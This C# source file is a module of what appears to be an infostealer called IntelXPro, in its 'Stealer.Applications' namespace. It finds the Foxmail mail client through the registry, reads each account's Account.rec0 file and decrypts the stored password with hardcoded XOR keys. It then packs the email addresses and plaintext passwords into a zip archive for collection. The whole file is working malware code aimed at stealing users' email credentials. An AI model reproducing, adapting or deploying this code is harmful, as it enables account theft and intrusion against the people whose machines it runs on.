using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FoxMail : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command");
            if (registryKey == null)
            {
                return;
            }
            string text = registryKey.GetValue("") as string;
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            int num = text.LastIndexOf("Foxmail.exe", StringComparison.OrdinalIgnoreCase);
            if (num < 0)
            {
                return;
            }
            string path = Path.Combine(text.Substring(0, num).Replace("\"", "").TrimEnd('\\', ' '), "Storage");
            if (!Directory.Exists(path))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FoxMail";
            string[] directories = Directory.GetDirectories(path, "*@*", SearchOption.TopDirectoryOnly);
            foreach (string obj in directories)
            {
                string fileName = Path.GetFileName(obj);
                string text2 = Path.Combine(obj, "Accounts");
                if (!Directory.Exists(text2))
                {
                    continue;
                }
                string text3 = Path.Combine(text2, "Account.rec0");
                if (File.Exists(text3))
                {
                    string text4 = Path.Combine(Path.GetTempPath(), $"Account_{Guid.NewGuid():N}.rec");
                    File.Copy(text3, text4, overwrite: true);
                    bool found;
                    int ver;
                    string text5 = ParseSecretFileAndGetPassword(text4, out found, out ver);
                    if (found)
                    {
                        string text6 = "Foxmail\\" + fileName + "\\Account.txt";
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.AppendLine("E-Mail: " + fileName);
                        stringBuilder.AppendLine("Password: " + text5);
                        stringBuilder.AppendLine("FoxmailVersionDetected: " + ((ver == 0) ? "6.x" : "7.x or later"));
                        zip.AddTextFile(text6, stringBuilder.ToString());
                        counterApplications.Files.Add(text3 + " => " + text6);
                    }
                    else
                    {
                        string text7 = "Foxmail\\" + fileName + "\\Account.rec0";
                        zip.AddFile(text7, File.ReadAllBytes(text3));
                        counterApplications.Files.Add(text3 + " => " + text7);
                    }
                    File.Delete(text4);
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private string ParseSecretFileAndGetPassword(string path, out bool found, out int ver)
        {
            found = false;
            ver = 1;
            byte[] array = File.ReadAllBytes(path);
            if (array == null || array.Length == 0)
            {
                return string.Empty;
            }
            if (array[0] == 208)
            {
                ver = 0;
            }
            else
            {
                ver = 1;
            }
            string text = "";
            string value = "";
            for (int i = 0; i < array.Length; i++)
            {
                byte b = array[i];
                if (b > 32 && b < 127 && b != 61)
                {
                    string text2 = text;
                    char c = (char)b;
                    text = text2 + c;
                    if (text.Equals("Account", StringComparison.Ordinal))
                    {
                        value = ReadAsciiValue(array, ref i, ver);
                        text = "";
                    }
                    else if (text.Equals("POP3Account", StringComparison.Ordinal))
                    {
                        value = ReadAsciiValue(array, ref i, ver);
                        text = "";
                    }
                    else if ((text.Equals("Password", StringComparison.Ordinal) || text.Equals("POP3Password", StringComparison.Ordinal)) && !string.IsNullOrEmpty(value))
                    {
                        string strHash = ReadAsciiValue(array, ref i, ver);
                        string result = DecodePW(ver, strHash);
                        found = true;
                        return result;
                    }
                }
                else
                {
                    text = "";
                }
            }
            return string.Empty;
        }

        private string ReadAsciiValue(byte[] bits, ref int jx, int ver)
        {
            int i = jx + 9;
            if (ver == 0)
            {
                i = jx + 2;
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (; i < bits.Length && bits[i] > 32 && bits[i] < 127; i++)
            {
                stringBuilder.Append((char)bits[i]);
            }
            jx = i;
            return stringBuilder.ToString();
        }

        private string DecodePW(int ver, string strHash)
        {
            string text = string.Empty;
            int[] array;
            int num;
            if (ver == 0)
            {
                array = new int[8] { 126, 100, 114, 97, 71, 111, 110, 126 };
                num = Convert.ToInt32("5A", 16);
            }
            else
            {
                array = new int[8] { 126, 70, 64, 55, 37, 109, 36, 126 };
                num = Convert.ToInt32("71", 16);
            }
            int num2 = strHash.Length / 2;
            int num3 = 0;
            int[] array2 = new int[num2];
            for (int i = 0; i < num2; i++)
            {
                array2[i] = Convert.ToInt32(strHash.Substring(num3, 2), 16);
                num3 += 2;
            }
            int[] array3 = new int[array2.Length];
            array3[0] = array2[0] ^ num;
            if (array2.Length > 1)
            {
                Array.Copy(array2, 1, array3, 1, array2.Length - 1);
            }
            while (array2.Length > array.Length)
            {
                int[] array4 = new int[array.Length * 2];
                Array.Copy(array, 0, array4, 0, array.Length);
                Array.Copy(array, 0, array4, array.Length, array.Length);
                array = array4;
            }
            int[] array5 = new int[array2.Length];
            for (int j = 1; j < array2.Length; j++)
            {
                array5[j - 1] = array2[j] ^ array[j - 1];
            }
            int[] array6 = new int[array5.Length];
            for (int k = 0; k < array5.Length - 1; k++)
            {
                if (array5[k] - array3[k] < 0)
                {
                    array6[k] = array5[k] + 255 - array3[k];
                }
                else
                {
                    array6[k] = array5[k] - array3[k];
                }
                text += (char)array6[k];
            }
            return text;
        }
    }
}
